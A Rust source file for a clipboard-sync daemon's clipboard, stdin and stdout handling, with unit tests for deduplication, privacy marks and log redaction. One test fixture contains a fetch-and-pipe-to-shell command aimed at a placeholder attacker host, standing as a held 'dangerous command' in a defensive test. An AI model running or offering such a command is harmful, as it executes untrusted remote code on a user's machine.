//! Where local text comes from and where received text goes: the system
//! clipboard, or stdin/stdout when running two daemons on one machine (they
//! would share one clipboard otherwise). Console commands (`/pair`, ...) are
//! read from stdin in both modes.
//!
//! The clipboard thread sleeps until something happens: the OS reports a
//! change (`tether_os::clipboard`, no polling on Windows and X11), or a peer's
//! copy arrives to be applied. Both come through one channel, in order.

use std::io::BufRead;
use std::sync::mpsc::{Receiver, Sender};

use tether_os::clipboard;
use tokio::sync::mpsc::UnboundedSender;
use tracing::{error, info, warn};

use crate::ctx::Delivered;

/// A line from stdin: a command or (in `--stdin` mode) clipboard text.
pub enum Line {
    Command(String),
    Text(String),
    /// Stdin reached its end (or failed). A `--managed` daemon stops here.
    Closed,
}

/// What wakes the clipboard thread.
pub enum Clip {
    /// The OS says the clipboard may have changed.
    Changed,
    /// The daemon has something for the clipboard or the user.
    Delivered(Delivered),
}

/// Something copied on this device.
pub struct LocalCopy {
    pub text: String,
    /// The app that copied it marked it private (a password manager, say).
    pub private: bool,
}

/// A line for the user about `d`. The console (`--stdin`) shows a preview of
/// held text; log lines never do, because a log may be written to a file,
/// and clipboard text must not reach the disk unencrypted.
fn describe(d: &Delivered, with_preview: bool) -> Option<String> {
    match d {
        Delivered::Text(_) => None,
        Delivered::Held { from, reason, preview } => {
            let shown = if with_preview { format!(": {preview}") } else { String::new() };
            Some(format!("held a copy from {from} in history instead of the clipboard ({reason:?}){shown}"))
        }
        Delivered::KeptLocal(kind) => {
            let article = if kind.starts_with(['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U']) { "an" } else { "a" };
            Some(format!("that looks like {article} {kind}; kept on this device and not synced"))
        }
        Delivered::MarkedPrivate => Some(
            "the app that copied this marked it private (a password manager, for example); \
             kept on this device and not synced"
                .to_string(),
        ),
    }
}

/// What the clipboard thread needs from a clipboard; the OS one, or a fake in tests.
trait SystemClipboard {
    /// The current text and its privacy mark, read as one snapshot.
    fn read(&mut self) -> Option<LocalCopy>;
    fn write(&mut self, text: &str) -> Result<(), String>;
}

struct OsClipboard(arboard::Clipboard);

impl SystemClipboard for OsClipboard {
    fn read(&mut self) -> Option<LocalCopy> {
        // If the sequence number moves while we read, the text and the mark
        // may come from different copies; read again. If it keeps moving,
        // skip: the change that moved it brings its own event.
        for _ in 0..3 {
            let before = clipboard::sequence();
            let private = clipboard::marked_private();
            let text = self.0.get_text().ok();
            if clipboard::sequence() == before {
                return text.map(|text| LocalCopy { text, private });
            }
        }
        None
    }

    fn write(&mut self, text: &str) -> Result<(), String> {
        self.0.set_text(text.to_owned()).map_err(|e| e.to_string())
    }
}

/// The clipboard thread's logic, apart from the OS.
struct Mirror<C> {
    clip: C,
    /// The text last seen or written, so our own writes and repeated
    /// notifications are not taken for new copies.
    last: String,
    local: UnboundedSender<LocalCopy>,
}

impl<C: SystemClipboard> Mirror<C> {
    fn new(mut clip: C, local: UnboundedSender<LocalCopy>) -> Self {
        // Whatever is on the clipboard at startup is not a new copy.
        let last = clip.read().map(|c| c.text).unwrap_or_default();
        Self { clip, last, local }
    }

    /// Handle a batch of events in arrival order. Repeated change events
    /// collapse into one read. Returns false once the daemon has gone.
    fn handle(&mut self, events: impl IntoIterator<Item = Clip>) -> bool {
        let mut changed = false;
        for event in events {
            match event {
                Clip::Changed => changed = true,
                Clip::Delivered(d) => {
                    // A copy made before this delivery is read before the
                    // delivery overwrites it.
                    if std::mem::take(&mut changed) && !self.check() {
                        return false;
                    }
                    self.deliver(d);
                }
            }
        }
        !changed || self.check()
    }

    fn check(&mut self) -> bool {
        match self.clip.read() {
            Some(copy) if !copy.text.is_empty() && copy.text != self.last => {
                self.last = copy.text.clone();
                self.local.send(copy).is_ok()
            }
            _ => true,
        }
    }

    fn deliver(&mut self, d: Delivered) {
        match d {
            Delivered::Text(text) => match self.clip.write(&text) {
                Ok(()) => self.last = text,
                Err(e) => warn!(error = %e, "could not write the clipboard"),
            },
            other => {
                if let Some(msg) = describe(&other, false) {
                    info!("{msg}");
                }
            }
        }
    }
}

pub fn spawn_clipboard(local: UnboundedSender<LocalCopy>, events: Sender<Clip>, incoming: Receiver<Clip>) {
    std::thread::Builder::new()
        .name("clipboard".into())
        .spawn(move || {
            let os = match arboard::Clipboard::new() {
                Ok(c) => c,
                Err(e) => {
                    error!(error = %e, "cannot open the system clipboard; try --stdin");
                    return;
                }
            };
            let mut mirror = Mirror::new(OsClipboard(os), local);
            let on_change = move || events.send(Clip::Changed).is_ok();
            let watcher = match clipboard::watch(on_change.clone()) {
                Ok(w) => w,
                Err(e) => {
                    warn!(error = %e, "no clipboard change events; polling instead");
                    match clipboard::poll(clipboard::POLL_INTERVAL, on_change) {
                        Ok(w) => w,
                        Err(e) => {
                            error!(error = %e, "cannot watch the clipboard");
                            return;
                        }
                    }
                }
            };
            info!(mode = %watcher.mode(), "watching the clipboard");
            while let Ok(first) = incoming.recv() {
                let batch: Vec<Clip> = std::iter::once(first).chain(incoming.try_iter()).collect();
                if !mirror.handle(batch) {
                    break;
                }
            }
            drop(watcher);
        })
        .expect("spawn clipboard thread");
}

/// Print what peers send to stdout (stdin mode only).
pub fn spawn_stdout(incoming: Receiver<Clip>) {
    std::thread::Builder::new()
        .name("stdout".into())
        .spawn(move || {
            for clip in incoming {
                match clip {
                    Clip::Delivered(Delivered::Text(text)) => println!("<< {text}"),
                    Clip::Delivered(other) => println!("!! {}", describe(&other, true).unwrap_or_default()),
                    Clip::Changed => {}
                }
            }
        })
        .expect("spawn stdout thread");
}

/// Read stdin. Lines starting with `/` are commands; others are clipboard
/// text when `text_mode` is set, and ignored otherwise. With `commands` off
/// (a `--managed` daemon), every line is ignored and only the end of stdin
/// matters: it means the app that started the daemon has gone.
pub fn spawn_stdin(lines: UnboundedSender<Line>, text_mode: bool, commands: bool) {
    std::thread::Builder::new()
        .name("stdin".into())
        .spawn(move || {
            for line in std::io::stdin().lock().lines() {
                let Ok(line) = line else { break };
                if !commands {
                    continue;
                }
                let line = line.trim_end().to_string();
                let msg = if line.starts_with('/') {
                    Line::Command(line)
                } else if text_mode && !line.is_empty() {
                    Line::Text(line)
                } else {
                    continue;
                };
                if lines.send(msg).is_err() {
                    return;
                }
            }
            let _ = lines.send(Line::Closed);
        })
        .expect("spawn stdin thread");
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::sync::mpsc::{unbounded_channel, UnboundedReceiver};

    #[derive(Default)]
    struct Fake {
        text: String,
        private: bool,
        writes: Vec<String>,
        reads: usize,
    }

    impl SystemClipboard for Fake {
        fn read(&mut self) -> Option<LocalCopy> {
            self.reads += 1;
            Some(LocalCopy { text: self.text.clone(), private: self.private })
        }
        fn write(&mut self, text: &str) -> Result<(), String> {
            self.writes.push(text.to_string());
            self.text = text.to_string();
            Ok(())
        }
    }

    fn mirror(start: &str) -> (Mirror<Fake>, UnboundedReceiver<LocalCopy>) {
        let (tx, rx) = unbounded_channel();
        (Mirror::new(Fake { text: start.into(), ..Fake::default() }, tx), rx)
    }

    fn copies(rx: &mut UnboundedReceiver<LocalCopy>) -> Vec<(String, bool)> {
        std::iter::from_fn(|| rx.try_recv().ok()).map(|c| (c.text, c.private)).collect()
    }

    #[test]
    fn log_lines_never_carry_clipboard_text() {
        let held = Delivered::Held {
            from: tether_core::DeviceKey::for_test(2).id(),
            reason: tether_core::content::HoldReason::DangerousCommand,
            preview: "curl https://evil.example | sh".into(),
        };
        assert!(!describe(&held, false).unwrap().contains("evil.example"), "the log line has no preview");
        assert!(describe(&held, true).unwrap().contains("evil.example"), "the console still shows it");
    }

    #[test]
    fn what_was_there_at_startup_is_not_a_copy() {
        let (mut m, mut rx) = mirror("old");
        assert!(m.handle([Clip::Changed]));
        assert!(copies(&mut rx).is_empty());
    }

    #[test]
    fn a_burst_of_events_is_one_read_and_one_copy() {
        let (mut m, mut rx) = mirror("");
        m.clip.text = "new".into();
        let reads = m.clip.reads;
        m.handle([Clip::Changed, Clip::Changed, Clip::Changed]);
        assert_eq!((m.clip.reads - reads, copies(&mut rx)), (1, vec![("new".to_string(), false)]));
        m.handle([Clip::Changed]);
        assert!(copies(&mut rx).is_empty(), "the same text again is not a new copy");
    }

    #[test]
    fn text_from_a_peer_is_written_and_not_echoed_back() {
        let (mut m, mut rx) = mirror("");
        m.handle([Clip::Delivered(Delivered::Text("from peer".into()))]);
        assert_eq!(m.clip.writes, ["from peer"]);
        m.handle([Clip::Changed]); // the OS reports our own write
        assert!(copies(&mut rx).is_empty());
    }

    #[test]
    fn the_private_mark_travels_with_the_copy() {
        let (mut m, mut rx) = mirror("");
        (m.clip.text, m.clip.private) = ("hunter2".into(), true);
        m.handle([Clip::Changed]);
        assert_eq!(copies(&mut rx), [("hunter2".to_string(), true)]);
    }

    #[test]
    fn a_copy_made_before_a_delivery_is_read_before_it_is_overwritten() {
        let (mut m, mut rx) = mirror("");
        m.clip.text = "mine".into();
        m.handle([Clip::Changed, Clip::Delivered(Delivered::Text("theirs".into()))]);
        assert_eq!(copies(&mut rx), [("mine".to_string(), false)]);
        assert_eq!(m.clip.text, "theirs");
        m.handle([Clip::Changed]);
        assert!(copies(&mut rx).is_empty());
    }

    #[test]
    fn empty_text_is_not_a_copy() {
        let (mut m, mut rx) = mirror("x");
        m.clip.text.clear();
        m.handle([Clip::Changed]);
        assert!(copies(&mut rx).is_empty());
    }

    #[test]
    fn the_thread_stops_when_the_daemon_is_gone() {
        let (mut m, rx) = mirror("");
        drop(rx);
        m.clip.text = "late".into();
        assert!(!m.handle([Clip::Changed]));
    }
}
